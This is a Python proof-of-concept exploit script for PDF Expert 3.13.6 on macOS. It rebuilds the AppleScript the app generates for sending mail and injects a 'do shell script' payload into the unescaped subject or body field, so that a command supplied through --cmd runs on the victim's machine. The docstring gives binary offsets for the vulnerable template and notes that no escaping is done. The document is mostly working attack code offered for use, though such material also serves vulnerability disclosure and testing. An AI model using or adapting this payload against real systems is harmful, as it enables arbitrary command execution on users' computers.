#!/usr/bin/env python3
"""Reconstruct the AppleScript PDF Expert 3.13.6 (1187) generates in
-sendMailViaAppleScriptWith:mailInfo:exportInfo: and inject an attacker payload.

Template anchors (arm64 slice, file_offset = 0x1494000 + (vaddr - 0x100000000)):
  0x100dc6db0  'tell application "Mail"\nset theTos to {'
  0x100dc6de0  '}\nset theCcs to {'
  0x100dc6e00  '}\nset theBccs to {'
  0x100dc6e20  '}\nset theAttachments to {'
  0x100dc6e40  '}\nset newMessage to make new outgoing message with properties {'
  0x10057d6dc  Swift small-string literal "subject:" (bytes 7573 6a62 6365 3a74)
  0x10057d784  Swift small-string literal "content:" (bytes 6f63 746e 6e65 3a74)
  0x100dc7060  '}\n    repeat with theAttachment in theAttachments ...'
  0x100dc71a0  '" & linefeed & linefeed'      <- body literal close + concatenation
  0x10057dd74  bl [NSAppleScript initWithSource:]
  0x10057dd9c  bl [NSAppleScript executeAndReturnError:]

Every attacker-controllable value is interpolated as '"' + value + '"' with a bare
quote emitted by the app (mov w8, #0x22) and NO escape helper anywhere on the path
(quotedFormOfStringValue / escape* = 0 hits in the executable).
"""
import argparse

# Recovered from the binary; keep byte-exact.
TEMPLATE = (
    'tell application "Mail"\n'
    'set theTos to {%s}\n'          # tos (already quoted by app)
    'set theCcs to {%s}\n'          # ccs
    'set theBccs to {%s}\n'         # bccs
    'set theAttachments to {%s}\n'  # attachments
    'set newMessage to make new outgoing message with properties {'
    'subject:%s, '                  # value WITH app-issued surrounding quotes
    'content:%s & linefeed & linefeed'
    '%s'                            # trailing template fragments
    '}\n'
    'end tell'
)

INJECT = 'x" & do shell script "%s" & "'


def quoted(v: str) -> str:
    # App wraps every value in bare quotes and never escapes.
    return '"' + v + '"'


def build(cmd: str, inject_into: str = "body") -> str:
    payload = INJECT % cmd
    tos = quoted("attacker@example.com")
    subject = quoted(payload if inject_into == "subject" else "Invoice")
    body = quoted(payload if inject_into == "body" else "See attached.")
    attachments = quoted("/tmp/report.pdf")
    return TEMPLATE % (
        tos, quoted(""), quoted(""), attachments, subject, body,
        '\n    set color of words to {}\n    repeat with theAttachment in theAttachments\n'
        '        make new attachment with properties {file name:theAttachment} at after last paragraph\n'
        '    end repeat\n         \n    delay 1\nend tell\n\nactivate\n',
    )


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--cmd", default="id > /tmp/pdfe_pwned")
    ap.add_argument("--field", choices=["body", "subject"], default="body")
    a = ap.parse_args()
    print(build(a.cmd, a.field))
